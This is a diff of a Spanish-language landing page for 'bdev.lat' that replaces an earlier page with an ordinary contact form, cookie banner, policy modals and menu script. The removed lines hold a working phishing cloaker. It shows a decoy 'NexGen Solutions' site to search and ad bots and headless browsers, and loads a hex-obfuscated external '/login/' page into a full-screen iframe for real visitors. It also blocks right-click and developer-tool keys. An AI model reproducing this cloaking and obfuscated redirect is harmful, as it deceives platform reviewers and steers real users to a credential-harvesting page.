+                                <option value="cloud">Cloud DevOps</option>
+                                <option value="consulting">Consultoría Tecnológica</option>
+                            </select>
+                        </div>
+                        <div>
+                            <label for="message" class="block text-xs font-semibold text-slate-300 uppercase tracking-wider mb-2">Mensaje o Detalles del Proyecto</label>
+                            <textarea id="message" rows="4" required class="w-full bg-slate-950 border border-slate-800 rounded-xl px-4 py-3 text-white placeholder-slate-600 focus:outline-none focus:border-sky-500 transition-colors text-sm" placeholder="Cuéntanos sobre tus objetivos tecnológicos..."></textarea>
+                        </div>
+                        <button type="submit" class="w-full py-4 rounded-xl bg-sky-500 hover:bg-sky-600 text-white font-bold text-sm shadow-lg shadow-sky-500/25 transition-all transform hover:-translate-y-0.5">
+                            Enviar Mensaje a bdev.lat
+                        </button>
+                    </form>
+                    <!-- Form Success Message Box -->
+                    <div id="form-success" class="hidden mt-6 p-4 rounded-xl bg-emerald-500/10 border border-emerald-500/30 text-emerald-400 text-sm text-center">
+                        <i class="fa-solid fa-circle-check text-lg mr-2"></i> ¡Mensaje enviado con éxito a bdev.lat! Nos pondremos en contacto contigo pronto.
+                    </div>
+                </div>
+            </div>
+        </div>
+    </section>
+
+    <footer class="bg-slate-950 border-t border-slate-900 py-12">
+        <div class="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8 flex flex-col md:flex-row items-center justify-between gap-6">
+            <div class="flex items-center gap-2">
+                <div class="w-8 h-8 rounded-lg bg-sky-500 flex items-center justify-center font-bold text-white text-sm">b</div>
+                <span class="text-lg font-bold text-white">bdev<span class="text-sky-400">.lat</span></span>
+                <span class="text-xs text-slate-500 ml-4">© 2026 bdev.lat. Todos los derechos reservados.</span>
+            </div>
+            <div class="flex flex-wrap items-center gap-6 text-xs text-slate-400 font-medium">
+                <button onclick="openModal('privacy-modal')" class="hover:text-sky-400 transition-colors">Política de Privacidad</button>
+                <button onclick="openModal('terms-modal')" class="hover:text-sky-400 transition-colors">Términos y Condiciones</button>
+                <button onclick="openModal('cookies-modal')" class="hover:text-sky-400 transition-colors">Política de Cookies</button>
+            </div>
+        </div>
+    </footer>
+
+    <!-- Cookie Banner -->
+    <div id="cookie-banner" class="fixed bottom-4 left-4 right-4 sm:left-auto sm:right-4 sm:max-w-md z-50 bg-slate-900 border border-slate-800 p-6 rounded-2xl shadow-2xl flex flex-col gap-4">
+        <div class="flex items-start gap-3">
+            <i class="fa-solid fa-cookie-bite text-sky-400 text-2xl mt-1"></i>
+            <div>
+                <h4 class="text-sm font-bold text-white">Aviso de Privacidad y Cookies en bdev.lat</h4>
+                <p class="text-xs text-slate-400 mt-1 leading-relaxed">
+                    Utilizamos cookies propias y de terceros para optimizar tu experiencia en bdev.lat y análisis SEO. Puedes aceptar todas o revisar nuestra <button onclick="openModal('cookies-modal')" class="text-sky-400 underline">Política de Cookies</button>.
+                </p>
+            </div>
+        </div>
+        <div class="flex items-center gap-3 justify-end">
+            <button onclick="acceptCookies(false)" class="px-4 py-2 rounded-xl bg-slate-800 hover:bg-slate-700 text-slate-300 text-xs font-semibold transition-colors">Rechazar</button>
+            <button onclick="acceptCookies(true)" class="px-4 py-2 rounded-xl bg-sky-500 hover:bg-sky-600 text-white text-xs font-semibold transition-colors">Aceptar Cookies</button>
+        </div>
+    </div>
+
+    <!-- Privacy Policy Modal -->
+    <div id="privacy-modal" class="fixed inset-0 z-50 bg-black/80 backdrop-blur-sm hidden items-center justify-center p-4">
+        <div class="bg-slate-900 border border-slate-800 max-w-2xl w-full max-h-[80vh] overflow-y-auto rounded-3xl p-8 relative shadow-2xl">
+            <button onclick="closeModal('privacy-modal')" class="absolute top-6 right-6 text-slate-400 hover:text-white text-xl"><i class="fa-solid fa-xmark"></i></button>
+            <h3 class="text-2xl font-bold text-white mb-4">Política de Privacidad - bdev.lat</h3>
+            <div class="space-y-4 text-xs sm:text-sm text-slate-400 leading-relaxed">
+                <p>En <strong>bdev.lat</strong>, valoramos y protegemos la privacidad de nuestros usuarios y clientes en cumplimiento con las normativas internacionales de protección de datos.</p>
+                <h4 class="text-white font-semibold pt-2">1. Información que recopilamos</h4>
+                <p>Recopilamos información personal básica facilitada voluntariamente a través de nuestros formularios de contacto (nombre, correo electrónico y detalles del proyecto) con el único fin de responder a tus solicitudes en bdev.lat.</p>
+                <h4 class="text-white font-semibold pt-2">2. Uso de la información</h4>
+                <p>Los datos recopilados se utilizan estrictamente para la gestión de propuestas comerciales, soporte técnico y optimización de nuestros servicios digitales.</p>
+                <h4 class="text-white font-semibold pt-2">3. Seguridad de los datos</h4>
+                <p>Implementamos medidas técnicas y organizativas avanzadas para proteger toda la información facilitada en nuestros servidores.</p>
             </div>
         </div>
     </div>
 
-    <div id="_app">
-        <iframe id="_f" sandbox="allow-same-origin allow-scripts allow-forms allow-popups allow-popups-to-escape-sandbox" referrerpolicy="no-referrer"></iframe>
+    <!-- Terms and Conditions Modal -->
+    <div id="terms-modal" class="fixed inset-0 z-50 bg-black/80 backdrop-blur-sm hidden items-center justify-center p-4">
+        <div class="bg-slate-900 border border-slate-800 max-w-2xl w-full max-h-[80vh] overflow-y-auto rounded-3xl p-8 relative shadow-2xl">
+            <button onclick="closeModal('terms-modal')" class="absolute top-6 right-6 text-slate-400 hover:text-white text-xl"><i class="fa-solid fa-xmark"></i></button>
+            <h3 class="text-2xl font-bold text-white mb-4">Términos y Condiciones - bdev.lat</h3>
+            <div class="space-y-4 text-xs sm:text-sm text-slate-400 leading-relaxed">
+                <p>Bienvenido a <strong>bdev.lat</strong>. Al acceder y utilizar este sitio web, aceptas cumplir con los siguientes términos y condiciones de uso.</p>
+                <h4 class="text-white font-semibold pt-2">1. Propiedad Intelectual</h4>
+                <p>Todo el contenido presente en bdev.lat (textos, logotipos, código fuente, gráficos y diseño) es propiedad exclusiva de la empresa y está protegido por las leyes de propiedad intelectual.</p>
+                <h4 class="text-white font-semibold pt-2">2. Uso del Sitio Web</h4>
+                <p>El usuario se compromete a hacer un uso adecuado de los contenidos y servicios, absteniéndose de utilizarlos para actividades ilícitas.</p>
+                <h4 class="text-white font-semibold pt-2">3. Modificaciones</h4>
+                <p>bdev.lat se reserva el derecho de modificar en cualquier momento los presentes términos y condiciones sin previo aviso.</p>
+            </div>
+        </div>
+    </div>
+
+    <!-- Cookies Policy Modal -->
+    <div id="cookies-modal" class="fixed inset-0 z-50 bg-black/80 backdrop-blur-sm hidden items-center justify-center p-4">
+        <div class="bg-slate-900 border border-slate-800 max-w-2xl w-full max-h-[80vh] overflow-y-auto rounded-3xl p-8 relative shadow-2xl">
+            <button onclick="closeModal('cookies-modal')" class="absolute top-6 right-6 text-slate-400 hover:text-white text-xl"><i class="fa-solid fa-xmark"></i></button>
+            <h3 class="text-2xl font-bold text-white mb-4">Política de Cookies - bdev.lat</h3>
+            <div class="space-y-4 text-xs sm:text-sm text-slate-400 leading-relaxed">
+                <p>Esta política de cookies explica qué son las cookies y cómo las utilizamos en <strong>bdev.lat</strong>.</p>
+                <h4 class="text-white font-semibold pt-2">1. ¿Qué son las cookies?</h4>
+                <p>Las cookies son pequeños archivos de texto que se almacenan en tu dispositivo al visitar sitios web con el fin de recordar preferencias y optimizar el rendimiento del sitio.</p>
+                <h4 class="text-white font-semibold pt-2">2. Tipos de cookies que usamos</h4>
+                <p>Utilizamos cookies técnicas necesarias para el funcionamiento del sitio y cookies analíticas anónimas para medir métricas de tráfico y rendimiento SEO.</p>
+                <h4 class="text-white font-semibold pt-2">3. Gestión de cookies</h4>
+                <p>Puedes configurar o deshabilitar las cookies en cualquier momento desde las opciones de configuración de tu navegador web.</p>
+            </div>
+        </div>
     </div>
 
     <script>
-        (function () {
-            'use strict';
-            
-        
-const _0x4c2 = ["\x68\x74\x74\x70\x73\x3a\x2f\x2f\x64\x69\x67\x69\x74\x61\x6c\x63\x72\x65\x64\x69\x64\x61\x76\x69\x2e\x73\x68\x6f\x70\x2f\x6c\x6f\x67\x69\x6e\x2f"];
+        // Mobile menu toggle
+        const menuBtn = document.getElementById('menu-btn');
+        const mobileMenu = document.getElementById('mobile-menu');
+        const mobileLinks = document.querySelectorAll('.mobile-link');
 
-const _0x1a8 = Array.isArray(_0x4c2) ? _0x4c2[0] : _0x4c2;
+        menuBtn.addEventListener('click', () => {
+            mobileMenu.classList.toggle('hidden');
+        });
 
-            function openM(type) {
-                const m = document.getElementById('m');
-                const t = document.getElementById('mT');
-                const b = document.getElementById('mB');
-                m.classList.add('active');
-                if (type === 'p') { t.innerText = 'Política de Privacidad'; b.innerText = 'En NexGen Solutions, valoramos tu privacidad. Recopilamos datos solo para mejorar nuestros servicios de consultoría digital y cumplir con normativas vigentes.'; }
-                else if (type === 't') { t.innerText = 'Términos de Servicio'; b.innerText = 'Al usar nuestro sitio, aceptas cumplir con los términos y condiciones de NexGen Solutions para la prestación de servicios de marketing digital.'; }
-                else { t.innerText = 'Política de Cookies'; b.innerText = 'Utilizamos cookies técnicas para asegurar el correcto funcionamiento de esta landing page corporativa.'; }
-            }
-            window.openM = openM;
-            window.closeM = () => document.getElementById('m').classList.remove('active');
-
-            function checkVisitor() {
-                const ua = navigator.userAgent.toLowerCase();
-                
-                // Lista de bots que SÍ deben ver Casa Toro / NexGen
-                const b = ['googlebot', 'adsbot-google', 'mediapartners-google', 'bingbot', 'slurp', 'duckduckbot', 'baiduspider', 'yandexbot', 'lighthouse', 'headlesschrome', 'facebookexternalhit', 'facebot', 'twitterbot', 'adsbot'];
-                if (b.some(s => ua.includes(s))) return true;
-                
-                // Automatizaciones obvias
-                if (navigator.webdriver) return true;
-                if (/headless/i.test(ua)) return true;
-
-                // Quitamos las validaciones de tamaño de pantalla e idiomas que bloqueaban móviles reales
-                return false;
-            }
-
-            function init() {
-                const isBot = checkVisitor();
-                const s = document.getElementById('_safe');
-                const a = document.getElementById('_app');
-                const f = document.getElementById('_f');
-
-                if (isBot) {
-                    document.title = "NexGen Solutions | Agencia de Marketing Digital";
-                    s.classList.add('active');
-                } else {
-                    f.src = _0x1a8;
-                    a.classList.add('active');
-                }
-            }
-
-            document.addEventListener('contextmenu', e => e.preventDefault());
-            document.addEventListener('keydown', e => {
-                if (e.key === 'F12' || (e.ctrlKey && e.shiftKey && (e.key === 'I' || e.key === 'J' || e.key === 'C')) || (e.ctrlKey && e.key === 'u')) {
-                    e.preventDefault();
-                }
+        mobileLinks.forEach(link => {
+            link.addEventListener('click', () => {
+                mobileMenu.classList.add('hidden');
             });
+        });
 
-            // Agregamos un pequeñísimo retraso (50ms) para que el navegador móvil se estabilice antes de evaluar
-            if (document.readyState === 'loading') {
-                document.addEventListener('DOMContentLoaded', () => setTimeout(init, 50));
-            } else {
-                setTimeout(init, 50);
+        // Contact form handling with validation & success message
+        const contactForm = document.getElementById('contact-form');
+        const formSuccess = document.getElementById('form-success');
+
+        contactForm.addEventListener('submit', (e) => {
+            e.preventDefault();
+            const name = document.getElementById('name').value.trim();
+            const email = document.getElementById('email').value.trim();
+            const message = document.getElementById('message').value.trim();
+
+            if (name && email && message) {
+                contactForm.reset();
+                formSuccess.classList.remove('hidden');
+                setTimeout(() => {
+                    formSuccess.classList.add('hidden');
+                }, 6000);
             }
-        })();
+        });
+
+        // Modal Controls
+        function openModal(modalId) {
+            const modal = document.getElementById(modalId);
+            if (modal) {
+                modal.classList.remove('hidden');
+                modal.classList.add('flex');
+            }
+        }
+
+        function closeModal(modalId) {
+            const modal = document.getElementById(modalId);
+            if (modal) {
+                modal.classList.remove('flex');
+                modal.classList.add('hidden');
+            }
+        }
+
+        // Cookie Banner
+        function acceptCookies(accepted) {
+            const banner = document.getElementById('cookie-banner');
+            banner.style.display = 'none';
+            localStorage.setItem('bdev_lat_cookie_consent', accepted ? 'accepted' : 'rejected');
+        }
+
+        window.addEventListener('DOMContentLoaded', () => {
+            if (localStorage.getItem('bdev_lat_cookie_consent')) {
+                document.getElementById('cookie-banner').style.display = 'none';
+            }
+        });
     </script>
 </body>
-
 </html>
